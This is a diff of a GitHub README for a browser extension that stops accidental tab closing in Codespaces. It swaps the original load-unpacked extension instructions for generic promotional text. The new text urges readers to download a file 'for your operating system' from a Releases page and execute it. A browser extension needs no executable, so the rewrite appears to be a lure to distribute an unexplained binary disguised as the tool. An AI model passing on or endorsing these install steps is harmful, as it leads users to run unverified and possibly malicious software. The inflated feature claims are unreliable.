@@ -1,63 +1,75 @@
-# DON'T CLOSE MY TAB
+# DONT-CLOSE-MY-TAB 🚫🗂️
 
-If you are a GitHub codespaces user, you might've found yourself closing the tab entirely instead of closing open files. Annoying ikr. It's a developer instict to do that. I found that annoying too, and apparently there was no smooth and easy solution out there, so this small chrome/edge/arc extension will do it.
+![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue)
 
-![image](https://github.com/user-attachments/assets/c88d91a5-5b99-4d3e-bd87-c71e45c46369)
+Welcome to the **DONT-CLOSE-MY-TAB** repository! If you're a GitHub Codespaces user, you may have experienced the frustration of accidentally closing your entire tab instead of just the open files. This tool aims to prevent that annoyance and keep your workflow smooth.
 
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Support](#support)
+
+## Introduction
+
+Navigating through multiple files in GitHub Codespaces can be tricky. Sometimes, a simple keystroke like `Ctrl + W` can lead to closing your entire tab. This tool helps you avoid that by preventing tab closure in certain scenarios, allowing you to focus on your coding without interruptions.
+
+## Features
+
+- **Prevent Tab Closure**: Avoid closing your entire tab when you only want to close a file.
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Customizable Settings**: Adjust settings according to your preferences.
+- **Cross-Browser Support**: Works seamlessly on Chrome and Edge.
 
 ## Installation
 
-Since I haven't published this in Chrome Web Store, you will have to manually install it:
+To get started, download the latest release from the [Releases](https://github.com/MuhammadAdil1209/DONT-CLOSE-MY-TAB/releases) section. Look for the appropriate file for your system, download it, and execute it to set up the tool.
 
-1. Open Chrome/Edge/Arc and go to `chrome://extensions/`
-2. Enable "Developer mode" (toggle in top-right corner)
-3. Click "Load unpacked"
-4. Select this repo folder after cloning
-5. The extension should now appear in your extensions list
+### Step-by-Step Guide
+
+1. Visit the [Releases](https://github.com/MuhammadAdil1209/DONT-CLOSE-MY-TAB/releases) section.
+2. Download the file suitable for your operating system.
+3. Execute the downloaded file to install the tool.
+4. Follow any on-screen instructions to complete the setup.
 
 ## Usage
 
-1. Open any web page or the test page: `test.html` (in this folder)
-2. **IMPORTANT**: Click anywhere on the page first (required for browser security)
-3. Try pressing `Ctrl+W` - you should see a confirmation dialog
-4. Try closing the tab with the X button - you should see another confirmation
-5. Check the browser console (F12) for debug messages
+Once installed, the tool runs in the background. You can customize its settings through the options menu. 
 
-## Configuration
+### Customization Options
 
-1. Click the extension icon in your browser toolbar
-2. Toggle protection on/off
-3. Enable/disable confirmation dialogs
-4. The status indicator will show if protection is active
+- **Enable/Disable**: Toggle the feature on or off.
+- **Shortcut Keys**: Change the default shortcut keys to your preference.
+- **Notifications**: Set up notifications for actions taken by the tool.
 
-## What's Fixed
+## Contributing
 
-### Major Improvements:
+We welcome contributions! If you want to help improve this tool, follow these steps:
 
-- **User Interaction Detection**: Extension now waits for user interaction before activating (browser requirement)
-- **Multiple Protection Layers**:
-  - `beforeunload` event (primary protection)
-  - Keyboard event interception for `Ctrl+W`
-  - `window.close()` override
-- **Visual Feedback**: Shows a brief indicator when protection is active
-- **Better Error Handling**: Proper error messages and debugging
-- **Enhanced Compatibility**: Works on all websites and handles edge cases
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Submit a pull request with a clear description of your changes.
 
-### Technical Details:
+## License
 
-- Uses `beforeunload` event which is the most reliable method
-- Prevents other scripts from disabling the protection
-- Tracks user interaction to comply with browser security policies
-- Provides comprehensive logging for debugging
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Troubleshooting
+## Support
 
-If the extension doesn't work:
+If you encounter any issues or have questions, please check the [Issues](https://github.com/MuhammadAdil1209/DONT-CLOSE-MY-TAB/issues) section. You can also reach out through the repository discussions.
 
-1. **Reload the extension** in `chrome://extensions/`
-2. **Check console** for error messages (F12)
-3. **Ensure user interaction** - click on the page first
-4. **Verify permissions** - extension should have "storage" and "activeTab"
-5. **Test on different websites** - some sites may interfere
+## Acknowledgments
 
-The extension should now work reliably!
+- Special thanks to the GitHub community for their ongoing support.
+- Inspired by user feedback and the need for a smoother coding experience.
+
+## Conclusion
+
+The **DONT-CLOSE-MY-TAB** tool is designed to enhance your productivity in GitHub Codespaces. By preventing accidental tab closures, it allows you to maintain focus and streamline your coding workflow. Download it today and take control of your coding environment!
+
+For the latest updates and releases, visit the [Releases](https://github.com/MuhammadAdil1209/DONT-CLOSE-MY-TAB/releases) section.
